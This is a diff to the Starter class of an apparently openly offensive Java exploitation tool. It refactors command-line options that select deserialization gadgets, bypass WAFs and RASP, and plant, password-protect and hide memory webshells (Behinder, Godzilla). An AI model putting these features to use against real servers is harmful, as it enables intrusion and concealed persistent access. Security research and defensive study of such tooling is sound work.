@@ -23,7 +23,7 @@ import static com.qi4l.jndi.gadgets.utils.Strings.isFromExploit;
 
 public class Starter {
 
-    public static  CommandLine              cmdLine;
+    public static CommandLine cmdLine;
 
     public static String JYsoMode = "qi4L";
 
@@ -38,30 +38,7 @@ public class Starter {
         }
         if (args.length > 0 && args[0].equals("-yso")) {
             JYsoMode = "yso";
-            Options options = new Options();
-            options.addOption("yso", "ysoserial", true, "Java deserialization");
-            options.addOption("g", "gadget", true, "Java deserialization gadget");
-            options.addOption("p", "parameters", true, "Gadget parameters");
-            options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
-            options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
-            options.addOption("f", "file", true, "Write Output into FileOutputStream (Specified FileName)");
-            options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
-            options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)");
-            options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/version.txt]");
-            options.addOption("pw", "password", true, "Behinder or Godzilla password,default [p@ssw0rd]");
-            options.addOption("gzk", "godzilla-key", true, "Godzilla key,default [key]");
-            options.addOption("hk", "header-key", true, "MemoryShell Header Check,Request Header Key,default [Referer]");
-            options.addOption("hv", "header-value", true, "MemoryShell Header Check,Request Header Value,default [https://QI4L.cn/]");
-            options.addOption("ch", "cmd-header", true, "Request Header which pass the command to Execute,default [X-Token-Data]");
-            options.addOption("gen", "gen-mem-shell", false, "Write Memory Shell Class to File");
-            options.addOption("n", "gen-mem-shell-name", true, "Memory Shell Class File Name");
-            options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools (type 2 only support SpringControllerMS)");
-            options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
-            options.addOption("rh", "rhino", false, "ScriptEngineManager Using Rhino Engine to eval JS");
-            options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
-            options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
-            options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");
-            options.addOption("utf", "utf8-Overlong-Encoding", false, "UTF-8 Overlong Encoding Bypass waf");
+            final Options options = getOptions();
 
             CommandLineParser parser = new DefaultParser();
 
@@ -194,7 +171,7 @@ public class Starter {
                 } else {
                     out = System.out;
                 }
-                if (IS_UTF_Bypass){
+                if (IS_UTF_Bypass) {
                     Serializer.qiserialize4l(object, out);
                     ObjectPayload.Utils.releasePayload(payload, object);
                 } else {
@@ -210,6 +187,34 @@ public class Starter {
             }
             System.exit(0);
         }
+    }
+
+    private static Options getOptions() {
+        Options options = new Options();
+        options.addOption("yso", "ysoserial", true, "Java deserialization");
+        options.addOption("g", "gadget", true, "Java deserialization gadget");
+        options.addOption("p", "parameters", true, "Gadget parameters");
+        options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
+        options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
+        options.addOption("f", "file", true, "Write Output into FileOutputStream (Specified FileName)");
+        options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
+        options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)");
+        options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/version.txt]");
+        options.addOption("pw", "password", true, "Behinder or Godzilla password,default [p@ssw0rd]");
+        options.addOption("gzk", "godzilla-key", true, "Godzilla key,default [key]");
+        options.addOption("hk", "header-key", true, "MemoryShell Header Check,Request Header Key,default [Referer]");
+        options.addOption("hv", "header-value", true, "MemoryShell Header Check,Request Header Value,default [https://QI4L.cn/]");
+        options.addOption("ch", "cmd-header", true, "Request Header which pass the command to Execute,default [X-Token-Data]");
+        options.addOption("gen", "gen-mem-shell", false, "Write Memory Shell Class to File");
+        options.addOption("n", "gen-mem-shell-name", true, "Memory Shell Class File Name");
+        options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools (type 2 only support SpringControllerMS)");
+        options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
+        options.addOption("rh", "rhino", false, "ScriptEngineManager Using Rhino Engine to eval JS");
+        options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
+        options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
+        options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");
+        options.addOption("utf", "utf8-Overlong-Encoding", false, "UTF-8 Overlong Encoding Bypass waf");
+        return options;
     }
 
     private static void printUsage(Options options) {
